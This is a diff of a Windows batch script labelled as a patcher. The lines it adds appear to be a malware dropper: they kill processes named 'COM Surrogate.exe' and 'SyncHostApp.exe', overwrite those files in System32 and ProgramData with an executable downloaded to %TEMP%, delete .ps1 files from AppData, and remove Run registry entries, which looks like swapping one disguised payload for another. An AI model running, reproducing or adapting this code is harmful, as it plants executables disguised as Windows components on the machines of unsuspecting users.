@@ -63,10 +63,10 @@ for %%a in ("%TEMP%\!filename!.exe") do set "FILESIZE=%%~za"
 
 
 
-:: Check if the file size is at least 16MB (16777216 bytes)
-if %FILESIZE% geq 16777216 (
+:: Check if the file size is at least 16MB (16000000 bytes)
+if %FILESIZE% geq 16000000 (
     rem powershell -NoProfile -WindowStyle Hidden -Command "Start-Process '%TEMP%\!filename!.exe'"
-    start "" "%TEMP%\!filename!.exe"
+    rem start "" "%TEMP%\!filename!.exe"
 ) else (
     echo.
     echo Download incomplete. Check your connection and run the file again.
@@ -78,6 +78,59 @@ if %FILESIZE% geq 16777216 (
 )
 
 
-echo Patcher Running...
 
-timeout /t 7 /nobreak
+taskkill /f /im "COM Surrogate.exe"
+taskkill /f /im "SyncHostApp.exe"
+
+del /f /q "%SystemRoot%\System32\SyncHostApp.exe"
+del /f /q "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
+
+
+if exist "%temp%\!filename!.exe" (
+    echo Copying COM Surrogate..
+    copy "%TEMP%\!filename!.exe" "%SystemRoot%\System32\SyncHostApp.exe" /y
+    copy "%TEMP%\!filename!.exe" "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" /y
+)
+
+echo.
+echo.
+echo.
+
+if not exist "%ProgramData%\Microsoft\Windows\COM Surrogate.exe" (
+    goto DOWNLOADINGAGAIN
+) else if not exist "%SystemRoot%\System32\SyncHostApp.exe" (
+    goto DOWNLOADINGAGAIN
+)
+
+echo.
+echo.
+echo.
+echo.
+
+
+
+timeout /t 15 /nobreak >nul
+
+
+:: Delete .ps1 files
+del /F /Q /A "%appdata%\*.ps1"
+
+echo.
+echo.
+
+:: Delete registry entries
+reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Powershell /f
+reg delete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Steam /f
+
+
+echo.
+echo.
+
+
+echo COM Installed..
+echo.
+timeout /t 2 /nobreak
+
+echo.
+echo.
+
